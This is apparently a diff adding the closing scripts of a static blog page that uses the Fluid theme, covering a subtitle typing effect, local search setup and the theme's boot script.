+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
